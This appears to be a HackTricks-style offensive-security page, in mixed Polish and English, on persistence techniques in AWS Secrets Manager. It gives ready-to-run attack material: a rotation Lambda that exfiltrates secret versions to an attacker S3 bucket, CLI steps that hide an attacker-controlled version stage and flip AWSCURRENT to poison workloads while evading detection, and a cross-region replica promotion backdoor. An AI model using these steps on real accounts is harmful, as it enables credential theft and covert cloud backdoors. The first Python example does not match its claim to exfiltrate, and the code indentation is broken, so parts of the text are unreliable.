# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Więcej informacji:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Via Resource Policies

Możliwe jest **grant access to secrets to external accounts** za pomocą resource policies. Sprawdź [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) po więcej informacji. Zwróć uwagę, że aby **access a secret**, zewnętrzne konto będzie również **need access to the KMS key encrypting the secret**.

### Via Secrets Rotate Lambda

Aby automatycznie **rotate secrets**, wywoływana jest skonfigurowana **Lambda**. Jeśli atakujący mógłby **change** **the code** mógłby bezpośrednio **exfiltrate the new secret** do siebie.

This is how lambda code for such action could look like:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### Podmień funkcję Lambda rotacji na funkcję kontrolowaną przez atakującego za pomocą RotateSecret

Nadużyj `secretsmanager:RotateSecret`, aby przypisać sekret do funkcji Lambda rotacji kontrolowanej przez atakującego i wywołać natychmiastową rotację. Złośliwa funkcja eksfiltruje wersje sekretu (AWSCURRENT/AWSPENDING) podczas kroków rotacji (createSecret/setSecret/testSecret/finishSecret) do miejsca odbioru atakującego (np. S3 lub zewnętrzne HTTP).

- Wymagania
- Uprawnienia: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` dla atakującej funkcji Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (lub AttachRolePolicy) aby wyposażyć rolę wykonawczą Lambda w uprawnienia `secretsmanager:GetSecretValue` i najlepiej `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (aby rotacja dalej działała), KMS `kms:Decrypt` dla klucza KMS sekretu oraz `s3:PutObject` (lub ruch wychodzący) do eksfiltracji.
- Docelowy identyfikator sekretu (`SecretId`) z włączoną rotacją lub możliwość włączenia rotacji.

- Wpływ
- Atakujący uzyskuje wartość(y) sekretu bez modyfikowania oryginalnego kodu rotacji. Zmieniana jest tylko konfiguracja rotacji, aby wskazywała na funkcję Lambda atakującego. Jeśli nie zostanie wykryte, zaplanowane przyszłe rotacje będą dalej wywoływać funkcję atakującego.

- Kroki ataku (CLI)
1) Przygotuj miejsce odbioru dla eksfiltracji i rolę Lambda
- Utwórz bucket S3 do eksfiltracji oraz rolę wykonawczą zaufaną przez Lambda z uprawnieniami do odczytu sekretu i zapisu do S3 (oraz logów/KMS w razie potrzeby).
2) Wdróż funkcję Lambda atakującego, która na każdym kroku rotacji pobiera wartość(i) sekretu i zapisuje je do S3. Minimalna logika rotacji może po prostu skopiować AWSCURRENT do AWSPENDING i promować ją w finishSecret, aby utrzymać usługę w poprawnym stanie.
3) Podmień funkcję rotacji i wyzwól
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Zweryfikuj eksfiltrację, listując prefiks S3 dla tego sekretu i sprawdzając artefakty JSON.
5) (Opcjonalnie) Przywróć oryginalną funkcję rotacji Lambda, aby zmniejszyć wykrywalność.

- Przykładowa funkcja Lambda atakującego (Python) eksfiltrująca do S3
- Środowisko: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Abuse Secrets Manager version staging labels to plant an attacker-controlled secret version and keep it hidden under a custom stage (for example, `ATTACKER`) while production continues to use the original `AWSCURRENT`. At any moment, move `AWSCURRENT` to the attacker’s version to poison dependent workloads, then restore it to minimize detection. This provides stealthy backdoor persistence and rapid time-of-use manipulation without changing the secret name or rotation config.

- Wymagania
- Uprawnienia: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (do weryfikacji)
- Docelowy secret id w Regionie.

- Wpływ
- Utrzymanie ukrytej, kontrolowanej przez atakującego wersji sekretu i atomowe przełączenie `AWSCURRENT` na nią na żądanie, wpływając na każdego konsumenta rozwiązującego tę samą nazwę sekretu. Przełączenie i szybkie przywrócenie zmniejszają szansę wykrycia, jednocześnie umożliwiając kompromitację w momencie użycia.

- Kroki ataku (CLI)
- Przygotowanie
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Polecenia CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Uwagi
- Gdy podasz `--client-request-token`, Secrets Manager użyje go jako `VersionId`. Dodanie nowej wersji bez jawnego ustawienia `--version-stages` powoduje domyślne przesunięcie `AWSCURRENT` na nową wersję i oznaczenie poprzedniej jako `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Wykorzystaj multi-Region replication w Secrets Manager, aby stworzyć replikę docelowej tajemnicy w mniej monitorowanym Regionie, zaszyfruj ją kluczem KMS kontrolowanym przez attacker w tym Regionie, a następnie wypromuj replikę do samodzielnej tajemnicy i dołącz permisywną resource policy przyznającą attacker dostęp do odczytu. Oryginalna tajemnica w Regionie pierwotnym pozostaje niezmieniona, co daje trwały, ukryty dostęp do wartości tajemnicy przez wypromowaną replikę, omijając ograniczenia KMS/policy na pierwotnej.

- Wymagania
- Uprawnienia: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- W regionie repliki: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (lub `kms:PutKeyPolicy`) aby pozwolić attacker principal na `kms:Decrypt`.
- Konieczny attacker principal (user/role), który otrzyma dostęp do odczytu promowanej tajemnicy.

- Wpływ
- Trwała ścieżka dostępu między regionami do wartości tajemnicy poprzez samodzielną replikę używającą KMS CMK kontrolowanego przez attacker i permisywnej resource policy. Pierwotna tajemnica w oryginalnym Regionie pozostaje nietknięta.

- Atak (CLI)
- Zmienne
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Utworzyć klucz KMS kontrolowany przez atakującego w replikowanym regionie
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Sklonuj secret do R2 używając attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Wypromuj replikę do trybu samodzielnego w R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Dołącz permisywną politykę zasobów do oddzielnego sekretu w R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Odczytaj sekret z attacker principal w R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

